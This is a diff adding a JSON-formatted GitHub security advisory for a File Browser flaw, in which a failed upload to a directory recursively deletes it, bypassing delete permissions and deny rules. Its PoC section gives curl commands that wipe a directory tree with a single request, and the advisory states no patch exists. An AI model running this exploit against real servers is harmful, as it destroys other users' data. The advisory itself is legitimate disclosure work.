@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-c4fr-5f24-4wrj",
+  "repo": {
+    "cve_id": "CVE-2026-90929",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-863"
+    ],
+    "description": "## Summary\r\n\r\nThe direct-upload endpoint removes its target on a failed write, but never rejects a target that is an existing directory. A `POST` with `?override=true` aimed at a directory therefore fails inside `writeFile` - a directory cannot be opened for writing - and the failure cleanup then runs `RemoveAll` on the request path, recursively destroying the whole tree. The cleanup is gated by neither `Perm.Delete` nor the descendant rule walk, so an authenticated user holding only the default Create and Modify permissions can delete directories they are not allowed to delete, including rule-denied files inside them. Reported against v2.63.23 and verified at v2.63.23.\r\n\r\n## Details\r\n\r\n`resourcePostHandler` in `http/resource.go` authorizes the upload with `Perm.Create` and a rule check on the request path, then resolves the target:\r\n\r\n```go\r\n\tfile, err := files.NewFileInfo(&files.FileOptions{...})\r\n\tif err == nil {\r\n\t\tif r.URL.Query().Get(\"override\") != \"true\" {\r\n\t\t\treturn http.StatusConflict, nil\r\n\t\t}\r\n\r\n\t\t// Permission for overwriting the file\r\n\t\tif !d.user.Perm.Modify {\r\n\t\t\treturn http.StatusForbidden, nil\r\n\t\t}\r\n\t\t...\r\n\t}\r\n```\r\n\r\n`NewFileInfo` succeeds for an existing directory, and unlike `tusPostHandler` - which rejects one explicitly:\r\n\r\n```go\r\n\t\tif file != nil {\r\n\t\t\tif file.IsDir {\r\n\t\t\t\treturn http.StatusBadRequest, fmt.Errorf(\"cannot upload to a directory %s\", file.RealPath())\r\n\t\t\t}\r\n```\r\n\r\n- this handler has no `file.IsDir` guard. Execution falls through to `writeFile`, whose `OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, fileMode)` always fails on a directory (`is a directory` on Linux, `Access is denied` on Windows). The failure path then removes the target:\r\n\r\n```go\r\n\tif err != nil {\r\n\t\t_ = d.user.Fs.RemoveAll(r.URL.Path)\r\n\t}\r\n```\r\n\r\n`RemoveAll` recurses. Two authorization checks that the delete and patch handlers apply are absent here:\r\n\r\n- `Perm.Delete`, enforced by `resourceDeleteHandler`;\r\n- `checkDescendants`, added to `resourceDeleteHandler` and `resourcePatchHandler` for GHSA-77x8-73f4-5485, which walks the subtree and refuses the operation if a rule denies any path inside it.\r\n\r\n`ScopedFs.RemoveAll` does call `guard`, so the deletion cannot leave the user's scope - that is the fix for GHSA-fmm7-x4gx-8jhr, and it holds. `guard` proves containment only; it says nothing about the permission bits, the rules, or whether the target is a directory.\r\n\r\nThe cleanup was introduced in v2.5.0. A later fix, v2.16.0, removed the equivalent cleanup from `resourcePutHandler` but left the one in the upload path.\r\n\r\n## PoC\r\n\r\nPreconditions: an authenticated non-administrator with `create=true` and `modify=true` - the default preset - and `delete=false`.\r\n\r\n```bash\r\n# user \"guest\": perm.delete=false\r\nJWT=$(curl -s -X POST http://127.0.0.1:8333/api/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"guest\",\"password\":\"…\"}')\r\n\r\nmkdir -p srv/shared/team && echo data > srv/shared/team/plan.txt\r\n\r\n# 1) the delete endpoint correctly refuses\r\ncurl -o /dev/null -w '%{http_code}\\n' -X DELETE \\\r\n  http://127.0.0.1:8333/api/resources/shared/team -H \"X-Auth: $JWT\"\r\n# -> 403\r\n\r\n# 2) one upload request wipes the tree\r\ncurl -o /dev/null -w '%{http_code}\\n' -X POST \\\r\n  'http://127.0.0.1:8333/api/resources/shared/team?override=true' \\\r\n  -H \"X-Auth: $JWT\" --data-binary x\r\n# -> 500 ; srv/shared/team and its whole subtree are gone\r\n```\r\n\r\nThe server log shows the root cause: `POST /shared/team -> 500 … open <root>/shared/team: is a directory`.\r\n\r\nThe rule variant behaves the same way. With a global rule denying `/important2/secret.txt`, a direct `GET` or `DELETE` of that file returns `403`, but `POST /api/resources/important2?override=true` deletes the entire `important2` tree, the rule-denied file included.\r\n\r\nBoth results reproduce against the real handlers with the delete-permission and deny-rule negative controls in place: `DELETE /team` returns `403` and `POST /team/sub/secret.txt?override=true` returns `403`, while `POST /team?override=true` returns `500` and removes the tree.\r\n\r\n## Impact\r\n\r\nAn authenticated user with the default Create and Modify permissions can permanently delete any directory inside their scope with a single request, with no trash and no undo.\r\n\r\n- **`Perm.Delete` bypass.** Accounts deliberately granted upload-only access - create and modify, without delete - can destroy arbitrary directory trees.\r\n- **Deny-rule bypass.** Files protected by a rule are destroyed along with an allowed parent, the same class of failure as GHSA-77x8-73f4-5485 but through a handler that fix did not cover.\r\n- **Shared scopes.** Where several users share a scope, a restricted account can delete other users' data.\r\n\r\nConfidentiality is unaffected: the write is refused and nothing is disclosed.\r\n\r\n## Patches\r\n\r\nNone. The project is no longer maintained and no fix will ship.\r\n\r\n## Workarounds\r\n\r\nThere is no configuration that closes this while leaving uploads usable, because the affected request is an ordinary upload.\r\n\r\n- Withhold `Perm.Modify` from accounts that do not need to overwrite files. Without it the override branch returns `403` before reaching `writeFile`, and the cleanup is never reached.\r\n- Where a reverse proxy sits in front of File Browser, reject `POST` requests to `/api/resources/…` carrying `override=true` whose path has no file extension, or restrict them to trusted accounts. This is a heuristic, not a boundary.\r\n- Keep backups. The deletion is immediate and unrecoverable from within File Browser.\r\n\r\n## References\r\n\r\n- Descendant rule walk that this handler does not use: GHSA-77x8-73f4-5485\r\n- Scope containment on the same cleanup call, fixed and still holding: GHSA-fmm7-x4gx-8jhr\r\n- Directory rejection this handler is missing, as implemented for TUS uploads: `http/tus_handlers.go`\r\n",
+    "ghsa_id": "GHSA-c4fr-5f24-4wrj",
+    "html_url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-c4fr-5f24-4wrj",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-c4fr-5f24-4wrj"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-90929"
+      }
+    ],
+    "published_at": "2026-08-31T06:26:54Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Upload failure-cleanup recursively deletes directories, bypassing Perm.Delete and deny rules",
+    "updated_at": "2026-09-16T13:03:57Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": ">= 2.5.0, <= 2.63.23"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "filebrowser/filebrowser"
+}
